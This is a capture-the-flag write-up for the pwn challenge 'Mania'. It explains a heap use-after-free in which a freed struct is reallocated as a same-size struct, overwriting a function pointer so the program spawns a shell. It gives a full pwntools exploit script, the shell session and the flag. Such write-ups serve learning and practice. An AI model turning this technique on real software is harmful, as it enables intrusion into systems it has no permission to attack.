# Mania (PWN)

## Challenge Description

> Sometimes you need imaginary friends when there are no real ones around.

**Files:** `Mania.zip` → `chal`, `friends.c`, `Dockerfile`, `libc.so.6`, `ld.so`  
**Server:** `nc 0agn86asl3d2.boroctf.com 44996`  
**Protections:** Partial RELRO · Canary · NX · **No PIE** · not stripped  
**Flag Format:** `boroCTF{...}`

## TL;DR

Heap use-after-free with type confusion between two same-size (72-byte) structs. Freeing a `realPerson` and allocating the same chunk as an `imaginaryFriend` lets us overwrite the `conversate` function pointer (at chunk offset 64) through `special_ability`. Calling `interact` on the stale pointer jumps to `idealConversation` → `system("/bin/sh")`.

## Initial Analysis

### Step 1: Read the source

`friends.c` defines two structs, both **exactly 72 bytes**:

```c
struct imaginaryFriend {
    double rating;            // offset 0  (8 bytes)
    char title[32];           // offset 8
    char special_ability[32]; // offset 40
};                            // total: 72 bytes

struct realPerson {
    char firstName[32];       // offset 0
    char lastName[32];        // offset 32
    void (*conversate)();     // offset 64 (8 bytes)
};                            // total: 72 bytes
```

Same size → **same tcache bin** → the allocator will reuse a freed `realPerson` chunk for a new `imaginaryFriend` allocation.

### Step 2: Find the win function

```bash
objdump -d chal | grep -A 5 "idealConversation"
# 0x0000000000401731 <idealConversation>: call system("/bin/sh")
```

No PIE → address `0x401731` is **fixed at every run**.

### Step 3: Identify the vulnerability

Menu option `4` ("ghost" / free real friend) calls `free(rf)` but **does not NULL the pointer** — a classic use-after-free.

### Step 4: Map the struct overlap

```
Chunk layout (72 bytes):
Offset   realPerson              imaginaryFriend
 0 – 7   firstName[0..7]         rating (double)
 8 –39   firstName[8..31]        title[0..31]
40 –63   lastName[0..23]         special_ability[0..23]
64 –71   conversate (ptr)   ←→   special_ability[24..31]  ← overwrite target
```

Writing 24 bytes of padding + the 8-byte address of `idealConversation` into `special_ability` overwrites `conversate`.

## Solution

### Step 5: Write the exploit

**Key implementation detail found during debugging:** using a 31-character title caused `fgets` to consume the `special_ability` prompt before the payload could be sent (the `fgets` buffer boundary fell at the wrong place). Switching to an 8-character title ensured both prompts arrived separately and the payload landed correctly in `special_ability`.

```python
from pwn import *

elf = ELF('./chal')
ideal = elf.sym['idealConversation']   # 0x401731

p = remote('0agn86asl3d2.boroctf.com', 44996)

# Meet a real person (allocate realPerson chunk)
p.recvuntil(b'> '); p.sendline(b'3')
p.recvuntil(b'firstName: \n'); p.sendline(b'Joe')
p.recvuntil(b'lastName: \n'); p.sendline(b'Smith')

# Ghost — free realPerson (UAF: pointer not NULLed)
p.recvuntil(b'> '); p.sendline(b'4')

# Imagine — allocate imaginaryFriend (gets the same chunk via tcache)
p.recvuntil(b'> '); p.sendline(b'1')
p.recvuntil(b'title: \n')
p.sendline(b'A' * 8)                    # short title avoids fgets boundary issue

p.recvuntil(b'ability: \n')
payload = b'B' * 24 + p64(ideal)[:7]   # 31 bytes; fgets null-terminates byte 31
p.sendline(payload)

p.recvuntil(b'rating: \n'); p.sendline(b'1.0')

# Interact — calls rf->conversate() → idealConversation → shell
p.recvuntil(b'> '); p.sendline(b'5')

p.interactive()
```

### Step 6: Read the flag from the shell

```bash
$ ls
chal  flag.txt
$ cat flag.txt
boroCTF{hYp0M&nic_3xplO1taTio4}
```

## Flag

```
boroCTF{hYp0M&nic_3xplO1taTio4}
```

## Key Takeaways

- **UAF + same-size structs = type confusion** — when two structs share a tcache bin, freeing one and allocating the other gives complete control over the freed chunk's layout.
- **No PIE = fixed gadgets** — without ASLR, function addresses are constants across every run. `idealConversation` is always at `0x401731`.
- **`fgets` boundary sensitivity** — input length for each field matters with heap challenges. A title that fills `fgets`' buffer silently consumes the next prompt, breaking the exploit flow.
- **`p64(addr)[:7]`** — writing 7 bytes of the 8-byte address is sufficient when `fgets` null-terminates the 8th position and the high byte of a 48-bit canonical address is already `0x00`.

## Tools Used

- `checksec` — binary protections audit
- `objdump` — `idealConversation` address extraction
- `pwntools` — exploit scripting and remote interaction
- `gdb` (pwndbg) — heap layout debugging during development
